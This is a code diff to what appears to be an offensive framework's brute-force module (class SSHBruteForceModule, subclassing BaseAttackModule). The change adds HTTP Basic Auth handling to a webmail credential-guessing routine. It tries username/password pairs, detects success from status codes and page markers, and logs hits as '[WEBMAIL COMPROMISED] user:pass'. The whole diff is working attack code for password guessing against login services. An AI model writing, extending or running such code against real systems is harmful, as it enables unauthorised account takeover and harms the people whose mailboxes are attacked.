@@ -587,39 +587,75 @@ class SSHBruteForceModule(BaseAttackModule):
             ) as session:
 
                 # GET request to fetch login page and CSRF token
+                # Using HTTP Basic Auth fallback if URL contains credentials
+                auth = None
+                if "@" in login_url and "://" in login_url:
+                    parts = login_url.split("://")
+                    if "@" in parts[1]:
+                        creds, host = parts[1].split("@", 1)
+                        if ":" in creds:
+                            user, pwd = creds.split(":", 1)
+                            auth = aiohttp.BasicAuth(user, pwd)
+                
                 async with session.get(
                     login_url,
                     timeout=aiohttp.ClientTimeout(total=timeout),
                     ssl=ssl_ctx,
                     allow_redirects=True,
-                    proxy=proxy_url,          # proxy per request
+                    proxy=proxy_url,
+                    auth=auth,
                 ) as get_resp:
                     body_get      = await get_resp.text()
                     canonical_url = str(get_resp.url)
+                    
+                    # If the GET request hits a 401 Unauthorized, the target might be using HTTP Basic Auth
+                    # instead of a form-based login. We need to handle this by making the POST request
+                    # directly with HTTP Basic Auth instead of Form Data.
+                    is_basic_auth = get_resp.status == 401
 
-                field_name, token_value = _extract_token(body_get)
+                if is_basic_auth:
+                    # Target uses HTTP Basic Auth. We must use a GET request instead of a POST
+                    # because Basic Auth is usually challenged on GET requests.
+                    field_name, token_value = default_token_field, None
+                    post_auth = aiohttp.BasicAuth(username, password)
+                    
+                    async with session.get(
+                        canonical_url,
+                        timeout=aiohttp.ClientTimeout(total=timeout),
+                        ssl=ssl_ctx,
+                        allow_redirects=False,
+                        proxy=proxy_url,
+                        auth=post_auth,
+                    ) as auth_resp:
+                        post_status = auth_resp.status
+                        location    = auth_resp.headers.get("Location", "")
+                        body_post   = await auth_resp.text()
+                else:
+                    field_name, token_value = _extract_token(body_get)
 
-                # Prepare POST data
-                post_data = {
-                    user_field:   username,
-                    pass_field:   password,
-                    action_field: action_value,
-                }
-                if token_value:
-                    post_data[field_name] = token_value
+                    # Prepare POST data
+                    post_data = {
+                        user_field:   username,
+                        pass_field:   password,
+                        action_field: action_value,
+                    }
+                    if token_value:
+                        post_data[field_name] = token_value
+                    post_auth = auth
 
-                # POST credentials
-                async with session.post(
-                    canonical_url,
-                    data=post_data,
-                    timeout=aiohttp.ClientTimeout(total=timeout),
-                    ssl=ssl_ctx,
-                    allow_redirects=False,
-                    proxy=proxy_url,          # same proxy for POST
-                ) as post_resp:
-                    post_status = post_resp.status
-                    location    = post_resp.headers.get("Location", "")
-                    body_post   = await post_resp.text()
+                    # POST credentials
+                    async with session.post(
+                        canonical_url,
+                        data=post_data,
+                        timeout=aiohttp.ClientTimeout(total=timeout),
+                        ssl=ssl_ctx,
+                        allow_redirects=False,
+                        proxy=proxy_url,
+                        auth=post_auth,
+                    ) as auth_resp:
+                        post_status = auth_resp.status
+                        location    = auth_resp.headers.get("Location", "")
+                        body_post   = await auth_resp.text()
 
             return post_status, location, body_post, canonical_url, token_value, field_name
 
@@ -699,8 +735,11 @@ class SSHBruteForceModule(BaseAttackModule):
                     has_fail = any(m in body_post for m in FAIL_MARKERS)
                     has_pass = any(m in body_post for m in PASS_MARKERS)
                     success_via_body = has_pass and not has_fail
+                    
+                    # HTTP Basic Auth returns 200 OK without specific body markers if successful
+                    success_via_basic_auth = post_status == 200 and not has_fail and auth is not None
 
-                    if success_via_redirect or success_via_body:
+                    if success_via_redirect or success_via_body or success_via_basic_auth:
                         await self.emit_event('INFO', 
                             f"\n[WEBMAIL COMPROMISED] {username}:{password}"
                             f"  loc={location or 'body-match'}\n"
